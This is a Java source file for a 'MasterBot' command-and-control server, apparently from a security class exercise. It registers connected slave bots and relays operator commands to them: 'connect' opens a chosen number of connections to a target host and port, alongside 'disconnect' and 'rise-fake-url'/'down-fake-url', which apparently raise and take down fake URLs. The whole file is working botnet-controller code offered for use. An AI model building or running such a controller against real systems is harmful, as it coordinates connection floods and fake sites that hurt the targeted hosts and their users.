package prbot;



import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousServerSocketChannel;
import java.nio.channels.AsynchronousSocketChannel;
import java.text.SimpleDateFormat;
import java.util.Scanner;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentMap;

/**
 * Created by chvijaydravid on 24/11/2017.
 */
public class MasterBot extends Thread {

    private final ConcurrentMap<String, AsyncSocketClient> clientsMap;
    private AsynchronousServerSocketChannel serverSocket;
    private boolean isRunning = true;

    public MasterBot(String host, int port) throws IOException {
        clientsMap = new ConcurrentHashMap<>();
        serverSocket = AsynchronousServerSocketChannel.open();
        serverSocket.bind(new InetSocketAddress(host, port));
    }

    @Override
    public void run() {
        while (isRunning) {
            try {
                AsyncSocketClient bean = new AsyncSocketClient(serverSocket.accept().get());
                clientsMap.put(bean.getClientId(), bean);
                bean.start();
            } catch (Exception ex) {
                System.err.println("Cannot accept new client, error " + ex.getMessage());
            }
        }
    }

    public class AsyncSocketClient extends Thread {

        private long startedTime;
        private String clientId;
        private final AsynchronousSocketChannel soc;
        private String clientAddress;
        private int clientPort;

        public AsyncSocketClient(AsynchronousSocketChannel soc) throws IOException {
            this.soc = soc;
            SocketAddress remoteAddress = soc.getRemoteAddress();
            String[] parseAddress = parseAddress(remoteAddress);
            int port = Integer.parseInt(parseAddress[1]);
            this.clientId = getHashAddress(parseAddress[0], port);
            this.clientAddress = parseAddress[0];
            this.clientPort = port;
            this.startedTime = System.currentTimeMillis();
        }

        public String getClientId() {
            return clientId;
        }

        public String getClientAddress() {
            return clientAddress;
        }

        public int getClientPort() {
            return clientPort;
        }

        public String getStartedTimeAsString() {
            return formatDate(startedTime);
        }

        public long getStartedTime() {
            return startedTime;
        }

        public String toString() {
            return "This clientId = [" + clientId + "] started on " + getStartedTimeAsString();
        }

        @Override
        public void run() {
            try {
                readResponse();
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    soc.shutdownInput();
                    soc.shutdownOutput();
                    soc.close();
                } catch (IOException ex) {
                }
            }
        }

        /**
         * Send a message to client
         *
         * @param request
         */
        public void sendRequest(String request) {
            if (null == request || request.isEmpty()) throw new IllegalArgumentException("Request is null or empty.");
            try {
                soc.write(ByteBuffer.wrap(request.getBytes())).get();
            } catch (Exception ex) {
                System.err.println("Error when send request message to client, error: " + ex.getMessage());
                ex.printStackTrace();
            }
        }

        private void readResponse() {
            ByteBuffer bbuf = ByteBuffer.allocateDirect(2048);
            byte[] bb = new byte[2048];
            int le = -1;
            while (true) {
                try {
                    le = soc.read(bbuf).get();
                    if (le != -1) {
                        bbuf.flip();
                        bbuf.get(bb, 0, le);
                        String message = new String(bb).trim();
                        System.out.println("'" + message + "'");
                        bbuf.clear();
                        //Take master's action
                    }
                } catch (Exception ex) {
                    System.err.println("Unknown error happends, error: " + ex.getMessage());
                    ex.printStackTrace();
                }
            }
        }
    }

    private static void raiseFakeUrl(MasterBot masterBot, String[] commands) {
        if (commands.length < 3) System.err.println("Incorrect rise-fake-url command");
        else {
            String finalCommand = "rise-fake-url " + commands[1] + " " + commands[2];
            sendRequestToSlave(masterBot, "all", finalCommand);
        }
    }

    private static void downFakeUrl(MasterBot masterBot, String[] commands) {
        if(commands.length < 2) System.err.println("Incorrect down-fake-url command");
        else {
            String finalCommand = "down-fake-url " + commands[1];
            sendRequestToSlave(masterBot, "all", finalCommand);
        }
    }

    private static void disconnectCommand(MasterBot masterBot, String[] commands) {
        if (commands.length < 3) System.err.println("Incorrect disconnect command");
        else {
            int target_port = 0;
            if (commands.length > 3) target_port = Integer.parseInt(commands[3]);
            final String finalCommand = (target_port == 0) ?
                    "disconnect " + commands[2] :
                    "disconnect " + commands[2] + " " + target_port;
            sendRequestToSlave(masterBot, commands[1], finalCommand);
        }
    }

    private static void connectCommand(MasterBot masterBot, String[] commands) {
        if (commands.length < 4) {
            System.err.println("Incorrect connect command");
            return;
        }
        int numConnection = 0;
        String commandWork = null;
        if (commands.length == 4) numConnection = 1;
        if (commands.length == 5) {
            if (commands[4].matches("^[0-9]+$")) numConnection = Integer.parseInt(commands[4]);
            else commandWork = commands[4];
        } else if (commands.length == 6) {
            numConnection = Integer.parseInt(commands[4]);
            commandWork = commands[5];
        } else {
            System.err.println("Incorrect connect command with more than 6 args");
        }
        //
        final String finalCommand = (commandWork == null) ?
                "connect " + commands[2] + " " + commands[3] + " " + numConnection :
                "connect " + commands[2] + " " + commands[3] + " " + numConnection + " " + commandWork;
        sendRequestToSlave(masterBot, commands[1], finalCommand);
    }

    private static void sendRequestToSlave(MasterBot masterBot, String targetSlave, String request) {
        if ("all".equals(targetSlave)) {
            masterBot.clientsMap.values().forEach(slave -> slave.sendRequest(request));
        } else {
            AsyncSocketClient client = masterBot.clientsMap.get(targetSlave);
            if (null == client) System.err.println("Slave address not found");
            else client.sendRequest(request);
        }
    }

    private static void printSlavesInformation(MasterBot masterBot) {
        masterBot.clientsMap.values().forEach(slave -> System.out.println(slave.toString()));
    }

    public static void main(String[] args) {
        String host = "127.0.0.1";
        int port = 8777;
        for (int i = 0; i < args.length; i += 2) {
            if (args[i].equals("-h") || args[i].equals("--host")) {
                host = args[i + 1];
            } else if (args[i].equals("-p") || args[i].equals("--port")) {
                port = Integer.parseInt(args[i + 1]);
            }
        }
        System.out.println("Master bot will be binded @ " + host + ":" + port);
        MasterBot masterBot = null;
        try {
            masterBot = new MasterBot(host, port);
            masterBot.start();
        } catch (Exception ex) {
            System.err.println("Could not run master bot. System will exit.");
            ex.printStackTrace();
            System.exit(0);
        }
        Scanner sc = new Scanner(System.in);
        while (true) {
            System.out.print(">");
            String[] command = sc.nextLine().split(" "); // here the server bot accepts the commands jsut like connect.
            if (command[0].equals("list")) printSlavesInformation(masterBot);
            else if (command[0].equals("connect")) connectCommand(masterBot, command);
            else if (command[0].equals("disconnect")) disconnectCommand(masterBot, command);
            else if (command[0].equals("rise-fake-url")) raiseFakeUrl(masterBot, command);
            else if (command[0].equals("down-fake-url")) downFakeUrl(masterBot, command);
            else System.err.println("Error: Incorrect command");
        }
    }

    private static String[] parseAddress(SocketAddress address) {
        String addressStr = address.toString();
        if (addressStr.startsWith("/")) addressStr = addressStr.replace("/", "");
        String[] tmp = addressStr.split(":");
        return tmp;
    }

    private static String getHashAddress(String host, int port) {
        return host + ":" + port;
    }

    private static SimpleDateFormat sdf = new SimpleDateFormat("MMM dd, yyyy HH:mm:ss");

    private static String formatDate(long timestamp) {
        return sdf.format(timestamp);
    }
}
